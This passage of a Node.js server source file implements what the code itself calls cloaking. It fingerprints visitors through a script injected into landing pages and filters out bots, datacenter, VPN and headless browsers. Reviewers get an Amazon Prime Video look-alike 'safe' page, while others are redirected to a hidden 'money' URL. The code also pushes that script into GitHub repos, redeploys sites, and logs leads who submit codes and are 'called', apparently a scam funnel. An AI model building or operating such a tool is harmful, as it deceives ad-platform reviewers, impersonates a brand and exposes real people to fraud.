app.post('/admin/settings/railway-token', requireAdmin, function(req, res) {
  var token = (req.body.railwayToken || '').trim();
  setRailwayToken(token); // stores in .local/railway_token (env var takes priority)
  res.redirect('/admin#settings');
});

// ─── Admin toggle cloaking ────────────────────────────────────────────────────
app.post('/admin/toggle', requireAdmin, async function(req, res) {
  var settings = readSettings();
  settings.enabled = !settings.enabled;
  writeSettings(settings);
  // Re-inject script + trigger Railway redeploy for default site
  var sites = readSites();
  var defSite = sites.find(function(s) { return s.isDefault; });
  if (defSite && defSite.githubRepo && process.env.GITHUB_TOKEN) {
    var hubUrl = 'https://' + (process.env.REPLIT_DEV_DOMAIN || req.headers.host || 'localhost');
    githubInject(defSite, hubUrl).then(function(r) {
      if (r && r.ok) {
        railwayDeploy(defSite).then(function(dr) {
          if (dr && dr.ok) setDeployStatus(defSite.id, 'building');
          setTimeout(pollRailwayStatuses, 30000);
        }).catch(function() { setTimeout(pollRailwayStatuses, 30000); });
      }
    }).catch(function() {});
  }
  res.redirect('/admin');
});

// ─── Admin clear logs ─────────────────────────────────────────────────────────
app.post('/admin/clear-logs', requireAdmin, function(req, res) {
  fs.writeFileSync(LOGS_FILE, '[]');
  res.redirect('/admin');
});

// ─── Admin clear leads ────────────────────────────────────────────────────────
app.post('/admin/clear-leads', requireAdmin, function(req, res) {
  fs.writeFileSync(LEADS_FILE, '[]');
  res.redirect('/admin');
});

// ─── Admin save blocked IPs ───────────────────────────────────────────────────
app.post('/admin/blocked-ips', requireAdmin, function(req, res) {
  var settings = readSettings();
  var raw = (req.body.blockedIps || '').trim();
  settings.blockedIps = raw
    .split(/[\n,]+/)
    .map(function(s) { return s.trim(); })
    .filter(function(s) { return s.length > 0; });
  writeSettings(settings);
  res.redirect('/admin');
});

// ─── Admin save allowed countries ────────────────────────────────────────────
app.post('/admin/allowed-countries', requireAdmin, function(req, res) {
  var settings = readSettings();
  var raw = (req.body.allowedCountries || '').trim();
  settings.allowedCountries = raw
    .split(/[\n,\s]+/)
    .map(function(s) { return s.trim().toUpperCase(); })
    .filter(function(s) { return s.length === 2; });
  writeSettings(settings);
  res.redirect('/admin');
});

// ─── Admin export blocked IPs for Google Ads ──────────────────────────────────
app.get('/admin/blocked-ips-export', requireAdmin, function(req, res) {
  var settings  = readSettings();
  var logs      = readLogs();
  var seen      = {};
  var unique    = [];
  var privateRe = /^(127\.|10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.|::1$|fd)/;

  function add(ip) {
    if (ip && !seen[ip] && !privateRe.test(ip)) { seen[ip] = true; unique.push(ip); }
  }

  (settings.blockedIps || []).forEach(add);
  logs.filter(function(l) { return l.decision === 'block'; }).forEach(function(l) { add(l.ip); });

  res.setHeader('Content-Type', 'text/plain; charset=utf-8');
  res.setHeader('Content-Disposition', 'attachment; filename="blocked-ips.txt"');
  res.send(unique.join('\n'));
});

app.post('/admin/clear-frequency', requireAdmin, function(req, res) {
  clearFrequencyStore();
  res.redirect('/admin');
});

app.post('/admin/set-timezone', requireAdmin, function(req, res) {
  var tz = (req.body.tz || 'UTC').trim();
  try { new Intl.DateTimeFormat('en', { timeZone: tz }); } catch(e) {
    return res.json({ ok: false, error: 'Invalid timezone' });
  }
  req.session.displayTz = tz;
  res.json({ ok: true, tz: tz });
});

app.post('/admin/block-ip-ajax', requireAdmin, function(req, res) {
  var ip     = (req.body.ip || '').trim();
  var siteId = (req.body.siteId || 'default').trim();
  if (!ip) return res.json({ ok: false, error: 'No IP' });
  if (siteId && siteId !== 'default') {
    var ss = readSites();
    var idx = ss.findIndex(function(s) { return s.id === siteId; });
    if (idx !== -1) {
      if (!Array.isArray(ss[idx].blockedIps)) ss[idx].blockedIps = [];
      if (!ss[idx].blockedIps.includes(ip)) { ss[idx].blockedIps.push(ip); writeSites(ss); }
    }
  } else {
    var cfg = readSettings();
    if (!Array.isArray(cfg.blockedIps)) cfg.blockedIps = [];
    if (!cfg.blockedIps.includes(ip)) { cfg.blockedIps.push(ip); writeSettings(cfg); }
  }
  res.json({ ok: true, ip: ip });
});

// ─── Admin sites management ───────────────────────────────────────────────────
app.post('/admin/sites', requireAdmin, async function(req, res) {
  var name      = (req.body.name || '').trim();
  var domain    = (req.body.domain || '').trim().replace(/^https?:\/\//, '').replace(/\/$/, '');
  var githubRepo = (req.body.githubRepo || '').trim();
  var moneyUrl  = (req.body.moneyUrl || '').trim();
  if (!name) return res.redirect('/admin?siteErr=name');

  var hubUrl = 'https://' + (process.env.REPLIT_DEV_DOMAIN || req.headers.host || 'localhost');
  var id = 'site-' + Date.now();
  var apiKey = crypto.randomUUID();
  var safeUrl = hubUrl + '/sites/' + id + '/safe';

  var newSite = {
    id: id, name: name, domain: domain, githubRepo: githubRepo,
    railwayProjectId: '', railwayServiceId: '',
    apiKey: apiKey, moneyUrl: moneyUrl, safeUrl: safeUrl,
    enabled: true, blockedIps: [], allowedCountries: [],
    deployStatus: 'pending', isDefault: false,
    createdAt: new Date().toISOString()
  };

  var sites = readSites();
  sites.push(newSite);
  writeSites(sites);

  // Background: auto-discover Railway IDs from GitHub repo URL, then inject + deploy
  if (githubRepo && process.env.GITHUB_TOKEN) {
    // Auto-discover Railway projectId/serviceId from the provided GitHub repo URL
    autoDiscoverRailwayIds(githubRepo).then(function(ids) {
      if (ids) {
        var ss = readSites();
        for (var i = 0; i < ss.length; i++) {
          if (ss[i].id === id) {
            ss[i].railwayProjectId = ids.projectId;
            ss[i].railwayServiceId = ids.serviceId;
            newSite.railwayProjectId = ids.projectId;
            newSite.railwayServiceId = ids.serviceId;
            break;
          }
        }
        writeSites(ss);
        console.log('Auto-discovered Railway IDs for site ' + id + ': project=' + ids.projectId + ' service=' + ids.serviceId);
      }
      // Inject script into GitHub, then trigger Railway redeploy
      return githubInject(newSite, hubUrl);
    }).then(function(r) {
      if (r && r.ok) {
        railwayDeploy(newSite).then(function(dr) {
          if (dr && dr.ok) setDeployStatus(id, 'building');
          setTimeout(pollRailwayStatuses, 30000);
        }).catch(function() { setTimeout(pollRailwayStatuses, 30000); });
      }
    }).catch(function() {});
  }

  res.redirect('/admin?site=' + id + '&siteCreated=1');
});

app.post('/admin/sites/:id/settings', requireAdmin, async function(req, res) {
  var id = req.params.id;
  var sites = readSites();
  var idx = sites.findIndex(function(s) { return s.id === id; });
  if (idx === -1) return res.redirect('/admin');

  var hubUrl = 'https://' + (process.env.REPLIT_DEV_DOMAIN || req.headers.host || 'localhost');
  var site = sites[idx];
  site.name             = (req.body.name       || site.name).trim();
  site.domain           = (req.body.domain     || '').trim().replace(/^https?:\/\//, '').replace(/\/$/, '') || site.domain;
  site.githubRepo       = (req.body.githubRepo !== undefined) ? req.body.githubRepo.trim() : site.githubRepo;
  site.railwayProjectId = (req.body.railwayProjectId !== undefined) ? req.body.railwayProjectId.trim() : site.railwayProjectId;
  site.railwayServiceId = (req.body.railwayServiceId !== undefined) ? req.body.railwayServiceId.trim() : site.railwayServiceId;
  site.moneyUrl         = (req.body.moneyUrl !== undefined) ? req.body.moneyUrl.trim() : site.moneyUrl;
  site.safeUrl          = (req.body.safeUrl  !== undefined && req.body.safeUrl.trim()) ? req.body.safeUrl.trim() : site.safeUrl;
  if (req.body.enabled !== undefined) {
    site.enabled = req.body.enabled !== 'false';
  }

  var raw = req.body.blockedIps || '';
  if (typeof raw === 'string') {
    site.blockedIps = raw.split(/[\n,]+/).map(function(s) { return s.trim(); }).filter(Boolean);
  }
  var rawCC = req.body.allowedCountries || '';
  if (typeof rawCC === 'string') {
    site.allowedCountries = rawCC.split(/[\n,\s]+/).map(function(s) { return s.trim().toUpperCase(); }).filter(function(s) { return s.length === 2; });
  }
  sites[idx] = site;
  writeSites(sites);

  // Re-inject if GitHub repo set and token available, then trigger Railway redeploy
  if (site.githubRepo && process.env.GITHUB_TOKEN) {
    githubInject(site, hubUrl).then(function(r) {
      if (r && r.ok) {
        // githubInject already set 'pushed' status + SSE emit; trigger Railway redeploy next
        railwayDeploy(site).then(function(dr) {
          if (dr && dr.ok) setDeployStatus(id, 'building');
          setTimeout(pollRailwayStatuses, 30000);
        }).catch(function() { setTimeout(pollRailwayStatuses, 30000); });
      }
    }).catch(function() {});
  }

  var qs = site.isDefault ? '' : '?site=' + id;
  res.redirect('/admin' + qs);
});

app.post('/admin/sites/:id/regenerate-key', requireAdmin, async function(req, res) {
  var id = req.params.id;
  var sites = readSites();
  var idx = sites.findIndex(function(s) { return s.id === id; });
  if (idx === -1) return res.redirect('/admin');

  var hubUrl = 'https://' + (process.env.REPLIT_DEV_DOMAIN || req.headers.host || 'localhost');
  sites[idx].apiKey = crypto.randomUUID();
  sites[idx].deployStatus = 'key-rotated';
  writeSites(sites);

  // Re-inject with new key, trigger Railway redeploy, then poll status
  if (sites[idx].githubRepo && process.env.GITHUB_TOKEN) {
    var siteSnapshot = sites[idx];
    githubInject(siteSnapshot, hubUrl).then(function(r) {
      if (r && r.ok) {
        // githubInject already set 'pushed' status + SSE emit
        railwayDeploy(siteSnapshot).then(function(dr) {
          if (dr && dr.ok) setDeployStatus(id, 'building');
          setTimeout(pollRailwayStatuses, 30000);
        }).catch(function() { setTimeout(pollRailwayStatuses, 30000); });
      }
    }).catch(function() {});
  }

  var qs = sites[idx].isDefault ? '' : '?site=' + id;
  res.redirect('/admin' + qs);
});

app.post('/admin/sites/:id/delete', requireAdmin, function(req, res) {
  var id = req.params.id;
  var sites = readSites();
  var site = sites.find(function(s) { return s.id === id; });
  if (!site || site.isDefault) return res.redirect('/admin'); // protect default
  writeSites(sites.filter(function(s) { return s.id !== id; }));
  res.redirect('/admin');
});

app.post('/admin/sites/:id/toggle', requireAdmin, async function(req, res) {
  var id = req.params.id;
  var sites = readSites();
  var idx = sites.findIndex(function(s) { return s.id === id; });
  if (idx !== -1) {
    sites[idx].enabled = !sites[idx].enabled;
    writeSites(sites);
    // Re-inject script so GitHub/Railway picks up the change
    var hubUrl = 'https://' + (process.env.REPLIT_DEV_DOMAIN || req.headers.host || 'localhost');
    if (sites[idx].githubRepo && process.env.GITHUB_TOKEN) {
      var toggledSite = sites[idx];
      githubInject(toggledSite, hubUrl).then(function(r) {
        if (r && r.ok) {
          // githubInject already set 'pushed' status + SSE emit
          railwayDeploy(toggledSite).then(function(dr) {
            if (dr && dr.ok) setDeployStatus(id, 'building');
            setTimeout(pollRailwayStatuses, 30000);
          }).catch(function() { setTimeout(pollRailwayStatuses, 30000); });
        }
      }).catch(function() {});
    }
  }
  var qs = (idx !== -1 && sites[idx] && !sites[idx].isDefault) ? '?site=' + id : '';
  res.redirect('/admin' + qs);
});

// ─── Hub-hosted safe and money pages ─────────────────────────────────────────
app.get('/sites/:siteId/safe', function(req, res) {
  var sites = readSites();
  var site = sites.find(function(s) { return s.id === req.params.siteId; });
  if (!site) return res.status(404).send('Site not found.');
  var siteName = escHtml(site.name);
  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Amazon Prime Video</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0f171e;color:#fff;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:24px;padding:20px;text-align:center}
.logo{font-size:2rem;font-weight:800;color:#00a8e1;letter-spacing:-1px}
.logo span{color:#fff}
h1{font-size:1.4rem;font-weight:600;max-width:440px;line-height:1.4}
p{font-size:0.9rem;color:#aaa;max-width:400px;line-height:1.6}
.btn{display:inline-block;margin-top:10px;padding:12px 32px;background:#00a8e1;color:#fff;border-radius:4px;font-weight:700;text-decoration:none;font-size:0.95rem}
.btn:hover{background:#0095c8}
</style>
</head>
<body>
<div class="logo">amazon<span>prime</span></div>
<h1>Start your 30-day free trial</h1>
<p>Watch thousands of movies, TV shows, and more. Fast delivery, exclusive deals, and unlimited streaming included with Prime membership.</p>
<a href="https://www.amazon.com/tryprimefree" class="btn">Try Prime Free</a>
</body>
</html>`);
});

app.get('/sites/:siteId/money', function(req, res) {
  var sites = readSites();
  var site = sites.find(function(s) { return s.id === req.params.siteId; });
  if (!site) return res.status(404).send('Site not found.');
  var target = site.moneyUrl || '/';
  res.redirect(302, target);
});

// ─── Clean URLs ───────────────────────────────────────────────────────────────
app.get('/:page', function(req, res) {
  var page = req.params.page;
  var filePath = path.join(__dirname, 'public', page + '.html');
  res.sendFile(filePath, function(err) {
    if (err) res.status(404).sendFile(path.join(__dirname, 'public', 'index.html'));
  });
});

app.listen(PORT, '0.0.0.0', function() {
  console.log('Server running on port ' + PORT);
});

// ─── Railway deployment status polling ───────────────────────────────────────
// Maps Railway GraphQL status strings to our internal deployStatus values
function mapRailwayStatus(raw) {
  if (!raw) return null;
  var s = raw.toLowerCase();
  if (s === 'success') return 'live';
  if (s === 'failed' || s === 'crashed' || s === 'removed') return 'failed';
  if (s === 'building' || s === 'deploying' || s === 'initializing') return 'building';
  return null; // unknown / don't overwrite
}

async function pollRailwayStatuses() {
  if (!getRailwayToken()) return;
  var sites = readSites();
  var changed = false;
  for (var i = 0; i < sites.length; i++) {
    var site = sites[i];
    if (!site.railwayProjectId || !site.railwayServiceId) continue;
    try {
      var raw = await getRailwayStatus(site);
      var mapped = mapRailwayStatus(raw);
      if (mapped && site.deployStatus !== mapped) {
        sites[i].deployStatus = mapped;
        changed = true;
        console.log('Railway status update: site=' + site.id + ' status=' + mapped);
        logEmitter.emit('siteStatus', { siteId: site.id, status: mapped });
      }
    } catch (e) { /* silent — Railway token may not be set */ }
  }
  if (changed) writeSites(sites);
}

// Poll once on startup (30s delay) then every 2 minutes
setTimeout(function() {
  pollRailwayStatuses();
  setInterval(pollRailwayStatuses, 2 * 60 * 1000);
}, 30000);

// ─── HTML templates ───────────────────────────────────────────────────────────
function adminLoginPage(errorHtml) {
  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>FILTER — Sign In</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,sans-serif;background:#070010;min-height:100vh;display:flex;align-items:center;justify-content:center;color:#e2d9f3}
.card{background:#0d001e;border:1px solid #1e0840;border-radius:16px;padding:44px 40px;width:100%;max-width:400px;box-shadow:0 16px 60px rgba(0,0,0,.7)}
.logo-row{display:flex;align-items:center;gap:10px;margin-bottom:24px}
.logo-svg{width:36px;height:36px}
.brand-name{font-size:1.4rem;font-weight:800;color:#e2d9f3;letter-spacing:-.5px}
.brand-tag{font-size:.62rem;color:#4e3d70;text-transform:uppercase;letter-spacing:1.2px;margin-top:1px}
h1{font-size:.9rem;font-weight:600;color:#9983b8;margin-bottom:22px}
label{display:block;font-size:.7rem;font-weight:700;text-transform:uppercase;letter-spacing:.5px;color:#4e3d70;margin-bottom:6px}
input[type=password]{width:100%;padding:11px 14px;background:#070010;border:1px solid #2e1260;border-radius:9px;color:#e2d9f3;font-size:.9rem;outline:none;transition:border .2s;font-family:inherit}
input[type=password]:focus{border-color:#7c3aed}
button{width:100%;margin-top:18px;padding:13px;background:#7c3aed;color:#fff;border:none;border-radius:9px;font-size:.95rem;font-weight:700;cursor:pointer;transition:background .2s;font-family:inherit}
button:hover{background:#6d28d9}
.error{color:#f87171;font-size:.82rem;margin-top:12px;text-align:center}
</style>
</head>
<body>
<div class="card">
  <div class="logo-row">
    <svg class="logo-svg" viewBox="0 0 36 36" fill="none">
      <defs><linearGradient id="lg" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#a855f7"/><stop offset="100%" stop-color="#6d28d9"/></linearGradient></defs>
      <path d="M4 5h28l-11 13.5V31l-6-3V18.5L4 5z" fill="url(#lg)" stroke="#7c3aed" stroke-width="1"/>
    </svg>
    <div>
      <div class="brand-name">FILTER</div>
      <div class="brand-tag">Traffic Management</div>
    </div>
  </div>
  <h1>Sign in to your dashboard</h1>
  <form method="POST" action="/admin/login">
    <label for="password">Admin Password</label>
    <input type="password" id="password" name="password" autofocus autocomplete="current-password" placeholder="Enter password">
    <button type="submit">Sign In →</button>
    ${errorHtml}
  </form>
</div>
</body>
</html>`;
}

function adminDashboardPage(settings, logs, leads, opts) {
  opts   = opts || {};
  leads  = Array.isArray(leads) ? leads : [];
  var logPage      = opts.logPage      || 1;
  var logTotal     = opts.logTotal     || logs.length;
  var leadPage     = opts.leadPage     || 1;
  var leadTotal    = opts.leadTotal    || leads.length;
  var activeCount  = opts.activeCount  || 0;
  var recentEvents = Array.isArray(opts.recentEvents) ? opts.recentEvents : [];
  var activeIpTimes = (opts.activeIpTimes && typeof opts.activeIpTimes === 'object') ? opts.activeIpTimes : {};
  var statsLogs    = Array.isArray(opts.allLogs)  ? opts.allLogs  : logs;
  var statsLeads   = Array.isArray(opts.allLeads) ? opts.allLeads : leads;
  var sites        = Array.isArray(opts.sites) ? opts.sites : [];
  var siteFilter   = opts.siteFilter || '';
  var selectedSite = opts.selectedSite || null;
  var hubUrl       = opts.hubUrl || '';
  var siteCreated  = opts.siteCreated || false;
  var hasGithubToken  = opts.hasGithubToken || false;
  var hasRailwayToken = opts.hasRailwayToken || false;
  var displayTz       = opts.displayTz || 'UTC';
  var now = new Date();
  var today = now.toISOString().slice(0, 10);
  var timeStr = now.toUTCString().slice(17, 25);

  // ── Stats ─────────────────────────────────────────────────────────────────
  var todayLogs    = statsLogs.filter(function(l) { return l.ts && l.ts.startsWith(today); });
  var todayAllow   = todayLogs.filter(function(l) { return l.decision === 'allow'; }).length;
  var todayBlock   = todayLogs.filter(function(l) { return l.decision === 'block'; }).length;
  var todayTotal   = todayAllow + todayBlock;
  var allAllow     = statsLogs.filter(function(l) { return l.decision === 'allow'; }).length;
  var allBlock     = statsLogs.filter(function(l) { return l.decision === 'block'; }).length;
  var allTotal     = allAllow + allBlock;
  var blockRate    = allTotal > 0 ? Math.round(allBlock / allTotal * 100) : 0;

  // ── Top countries ─────────────────────────────────────────────────────────
  var countryCounts = {};
  statsLogs.forEach(function(l) {
    var cc = l.country || 'XX';
    countryCounts[cc] = (countryCounts[cc] || 0) + 1;
  });
  var flags = { US:'🇺🇸',GB:'🇬🇧',CA:'🇨🇦',AU:'🇦🇺',IN:'🇮🇳',DE:'🇩🇪',FR:'🇫🇷',PH:'🇵🇭',MX:'🇲🇽',BR:'🇧🇷',NL:'🇳🇱',SG:'🇸🇬',JP:'🇯🇵',NG:'🇳🇬',PK:'🇵🇰',ZA:'🇿🇦',XX:'🌐' };
  var topCountries = Object.keys(countryCounts)
    .sort(function(a,b){ return countryCounts[b]-countryCounts[a]; })
    .slice(0, 5);
  var maxCC = topCountries.length > 0 ? countryCounts[topCountries[0]] : 1;
  var countryRows = topCountries.map(function(cc) {
    var cnt = countryCounts[cc];
    var pct = Math.round(cnt / maxCC * 100);
    var flag = flags[cc] || '🌐';
    return '<div class="cc-row"><span class="cc-flag">' + flag + '</span><span class="cc-code">' + escHtml(cc) + '</span><div class="cc-bar-wrap"><div class="cc-bar" style="width:' + pct + '%"></div></div><span class="cc-cnt">' + cnt + '</span></div>';
  }).join('') || '<p class="empty">No data yet</p>';

  // ── Block reasons (including new ones) ────────────────────────────────────
  var reasonCounts = {};
  statsLogs.filter(function(l){ return l.decision === 'block'; }).forEach(function(l) {
    var r = l.reason || 'unknown';
    reasonCounts[r] = (reasonCounts[r] || 0) + 1;
  });
  var reasonOrder = [
    'repeat-click','manual-block','country-block',
    'bot-ua','datacenter','proxy-vpn','suspicious-isp',
    'webdriver','no-screen','headless-screen','no-plugins-desktop'
  ];
  var reasonColors = {
    'repeat-click':'orange','manual-block':'orange','country-block':'orange',
    'bot-ua':'amber','webdriver':'amber','no-screen':'amber','headless-screen':'amber','no-plugins-desktop':'amber',
    'datacenter':'red','proxy-vpn':'red','suspicious-isp':'red'
  };
  var reasonPills = reasonOrder.filter(function(r){ return reasonCounts[r] > 0; }).map(function(r) {
    var col = reasonColors[r] || 'grey';
    return '<span class="pill pill-' + col + '">' + escHtml(r) + ' <strong>' + reasonCounts[r] + '</strong></span>';
  }).join('') || '<span class="empty">No blocks yet</span>';

  // ── Toggle ────────────────────────────────────────────────────────────────
  var toggleLabel  = settings.enabled ? 'Disable Cloaking' : 'Enable Cloaking';
  var pulseDot     = settings.enabled ? '<span class="pulse-dot"></span>' : '';
  var statusBadge  = settings.enabled
    ? pulseDot + '<span class="badge on">ENABLED</span>'
    : '<span class="badge off">DISABLED</span>';

  // ── Current traffic control state ────────────────────────────────────────
  var blockedIpsList    = Array.isArray(settings.blockedIps) ? settings.blockedIps : [];
  var allowedCountriesList = Array.isArray(settings.allowedCountries) ? settings.allowedCountries : [];
  var freqStoreSize     = ipFreqStore.size;
  var repeatClicksIn24h = statsLogs.filter(function(l) {
    return l.decision === 'block' && l.reason === 'repeat-click' && l.ts &&
      (Date.now() - new Date(l.ts).getTime()) < IP_FREQ_WINDOW_MS;
  }).length;

  // ── Timestamp formatter (timezone-aware) ─────────────────────────────────
  function fmtTs(ts) {
    if (!ts) return '';
    try {
      return new Date(ts).toLocaleString('en-GB', {
        timeZone: displayTz,
        day: '2-digit', month: 'short',
        hour: '2-digit', minute: '2-digit', second: '2-digit',
        hour12: false
      });
    } catch(e) { return ts.replace('T', ' ').slice(0, 19); }
  }

  // ── Country flag from ISO code ────────────────────────────────────────────
  function flagEmoji(code) {
    if (!code || code.length !== 2 || code === 'XX') return '🌐';
    try {
      return String.fromCodePoint(...[...code.toUpperCase()].map(function(c) {
        return 0x1F1E6 + c.charCodeAt(0) - 65;
      }));
    } catch(e) { return ''; }
  }

  // ── Log rows ──────────────────────────────────────────────────────────────
  function deviceType(ua) {
    if (!ua) return '—';
    if (/ipad|tablet|kindle|playbook|(android(?!.*mobile))/i.test(ua)) return 'Tablet';
    if (/mobile|iphone|ipod|android|blackberry|opera mini|iemobile|wpdesktop/i.test(ua)) return 'Mobile';
    return 'Desktop';
  }
  function locationStr(l) {
    if (!l.city) return escHtml(l.country || 'XX');
    var parts = [escHtml(l.city)];
    if (l.region) parts.push(escHtml(l.region));
    parts.push(escHtml(l.country || 'XX'));
    return parts.join(', ');
  }
  function reasonPill(r) {
    var col = {
      clean:'green',
      'repeat-click':'orange','manual-block':'orange','country-block':'orange',
      'bot-ua':'amber',webdriver:'amber','no-screen':'amber','headless-screen':'amber','no-plugins-desktop':'amber',
      datacenter:'red','proxy-vpn':'red','suspicious-isp':'red',
      disabled:'grey'
    }[r] || 'grey';
    return '<span class="rpill rpill-' + col + '">' + escHtml(r || '') + '</span>';
  }
  var logRows = logs.map(function(l) {
    var decCls  = l.decision === 'allow' ? 'dec-allow' : 'dec-block';
    var ts      = fmtTs(l.ts);
    var flag    = flagEmoji(l.country);
    var isp     = escHtml((l.isp || '').slice(0, 26));
    var screen  = (!l.screen || l.screen === '0x0') ? '—' : escHtml(l.screen);
    var visitorTz = escHtml((l.tz || '').slice(0, 30));
    var sId     = l.siteId || 'default';
    return '<tr>'
      + '<td class="t-mono t-ts">' + escHtml(ts) + '</td>'
      + '<td class="t-mono t-ip" data-ip="' + escHtml(l.ip || '') + '">' + escHtml(l.ip || '') + '</td>'
      + '<td><span class="t-flag">' + flag + '</span> ' + escHtml(l.country || 'XX') + '</td>'
      + '<td class="t-loc">' + escHtml(l.city || '') + '</td>'
      + '<td class="t-isp" title="' + escHtml(l.isp || '') + '">' + isp + '</td>'
      + '<td class="t-mono t-screen">' + screen + '</td>'
      + '<td class="t-tz">' + visitorTz + '</td>'
      + '<td><span class="' + decCls + '">' + escHtml(l.decision || '') + '</span></td>'
      + '<td>' + reasonPill(l.reason) + '</td>'
      + '<td><button class="quick-block-btn" data-ip="' + escHtml(l.ip || '') + '" data-site="' + escHtml(sId) + '" onclick="quickBlockIp(this)" title="Block this IP">&#9940;</button></td>'
      + '</tr>';
  }).join('');

  // ── Blocked IP export count (for Google Ads card) ────────────────────────
  var exportSeen = {};
  var privateRe  = /^(127\.|10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.|::1$|fd)/;
  (blockedIpsList).forEach(function(ip) { if (ip && !privateRe.test(ip)) exportSeen[ip] = true; });
  statsLogs.filter(function(l){ return l.decision === 'block' && l.ip; })
      .forEach(function(l){ if (!privateRe.test(l.ip)) exportSeen[l.ip] = true; });
  var exportCount = Object.keys(exportSeen).length;

  // ── Leads stats ───────────────────────────────────────────────────────────
  var allSubmits   = statsLeads.filter(function(l) { return l.type === 'code_submit'; });
  var submits      = leads.filter(function(l) { return l.type === 'code_submit'; });
  var todaySubmits = allSubmits.filter(function(l) { return l.ts && l.ts.startsWith(today); });
  var calledLeads  = allSubmits.filter(function(l) { return l.called; });
  var callRate     = allSubmits.length > 0 ? Math.round(calledLeads.length / allSubmits.length * 100) : 0;

  function adSource(l) {
    if (l.gclid) return '<span class="rpill rpill-amber">Google Ads</span>';
    var src = l.utm_campaign || l.utm_source || '';
    return src ? '<span style="font-size:0.72rem;color:#a78bfa">' + escHtml(src.slice(0, 20)) + '</span>' : '—';
  }

  var leadRows = submits.map(function(l) {
    var ts      = fmtTs(l.ts);
    var flag    = flagEmoji(l.country);
    var calledBadge = l.called
      ? '<span class="rpill rpill-green">Called</span>'
      : '<span class="rpill rpill-grey">Pending</span>';
    return '<tr>'
      + '<td class="t-mono t-ts">' + escHtml(ts) + '</td>'
      + '<td class="t-mono">' + escHtml(l.ip || '') + '</td>'
      + '<td><span class="t-flag">' + flag + '</span> ' + escHtml(l.country || 'XX') + '</td>'
      + '<td>' + escHtml(l.city || '') + '</td>'
      + '<td class="t-mono" style="color:#a855f7;font-weight:700">' + escHtml(l.code || '') + '</td>'
      + '<td>' + adSource(l) + '</td>'
      + '<td class="t-mono">' + escHtml((l.tz || '').slice(0, 30)) + '</td>'
      + '<td>' + calledBadge + '</td>'
      + '</tr>';
  }).join('');

  // ── Pagination helpers ────────────────────────────────────────────────────
  function paginationHtml(currentPage, total, pageSize, paramName, otherParam, otherVal) {
    var totalPages = Math.max(1, Math.ceil(total / pageSize));
    if (totalPages <= 1) return '';
    var prev = currentPage > 1 ? currentPage - 1 : null;
    var next = currentPage < totalPages ? currentPage + 1 : null;
    function href(p) {
      var params = paramName + '=' + p;
      if (otherParam && otherVal > 1) params += '&amp;' + otherParam + '=' + otherVal;
      if (siteFilter) params += '&amp;site=' + encodeURIComponent(siteFilter);
      return '/admin?' + params;
    }
    return '<div class="pagination">'
      + (prev ? '<a href="' + href(prev) + '" class="pag-btn">&larr; Prev</a>' : '<span class="pag-btn pag-disabled">&larr; Prev</span>')
      + '<span class="pag-info">Page ' + currentPage + ' of ' + totalPages + ' &nbsp;(&nbsp;' + total + ' total&nbsp;)</span>'
      + (next ? '<a href="' + href(next) + '" class="pag-btn">Next &rarr;</a>' : '<span class="pag-btn pag-disabled">Next &rarr;</span>')
      + '</div>';
  }
  var logPaginationHtml  = paginationHtml(logPage,  logTotal,  LOG_PAGE_SIZE,  'logPage',  'leadPage', leadPage);
  var leadPaginationHtml = paginationHtml(leadPage, leadTotal, LEAD_PAGE_SIZE, 'leadPage', 'logPage',  logPage);

  // ── Site selector bar ─────────────────────────────────────────────────────
  var siteOptions = sites.map(function(s) {
    var sel = s.id === siteFilter ? ' selected' : '';
    return '<option value="' + escHtml(s.id) + '"' + sel + '>' + escHtml(s.name) + (s.isDefault ? ' (default)' : '') + '</option>';
  }).join('');

  function siteSnippet(s) {
    if (!s.apiKey) return '';
    var safeHref = s.safeUrl || hubUrl + '/sites/' + s.id + '/safe';
    var moneyHref = hubUrl + '/sites/' + s.id + '/money';
    var snip = '<!-- Paste this inside <head> on your landing page -->\n'
      + '<!-- StreamFix-Hub-Start -->\n'
      + '<script>\n'
      + '(function(){\n'
      + '  var _h=\'' + hubUrl + '\',_k=\'' + s.apiKey + '\';\n'
      + '  try{\n'
      + '    fetch(_h+\'/api/cloak\',{\n'
      + '      method:\'POST\',\n'
      + '      headers:{\'Content-Type\':\'application/json\',\'X-Site-Key\':_k},\n'
      + '      body:JSON.stringify({\n'
      + '        ua:navigator.userAgent,sw:screen.width,sh:screen.height,\n'
      + '        wd:!!navigator.webdriver,\n'
      + '        pl:(navigator.plugins||[]).length,\n'
      + '        tz:Intl.DateTimeFormat().resolvedOptions().timeZone\n'
      + '      })\n'
      + '    }).then(function(r){return r.json()})\n'
      + '    .then(function(d){if(d&&d.url)window.location.replace(d.url)})\n'
      + '    .catch(function(){});\n'
      + '  }catch(e){}\n'
      + '})();\n'
      + '<\/script>\n'
      + '<!-- StreamFix-Hub-End -->';
    return snip;
  }

  // ── Hourly traffic chart data ────────────────────────────────────────────
  var hourlyAllow  = new Array(24).fill(0);
  var hourlyBlock  = new Array(24).fill(0);
  todayLogs.forEach(function(l) {
    if (l.ts) {
      var h = parseInt(l.ts.slice(11, 13)) || 0;
      if (l.decision === 'allow') hourlyAllow[h]++;
      else hourlyBlock[h]++;
    }
  });
  var todayLeadCount  = todaySubmits.length;
  var blockRateToday  = todayTotal > 0 ? Math.round(todayBlock / todayTotal * 100) : 0;
  var hourlyAllowJson = JSON.stringify(hourlyAllow);
  var hourlyBlockJson = JSON.stringify(hourlyBlock);

  // ── Compact reason table for dashboard ───────────────────────────────────
  var reasonTableRows = reasonOrder.filter(function(r){ return reasonCounts[r] > 0; }).map(function(r) {
    var cnt  = reasonCounts[r];
    var pct  = allBlock > 0 ? Math.round(cnt / allBlock * 100) : 0;
    var col  = reasonColors[r] || 'grey';
    return '<tr><td>' + escHtml(r) + '</td><td class="t-right"><span class="rpill rpill-' + col + '">' + cnt + '</span></td><td class="t-right t-muted">' + pct + '%</td></tr>';
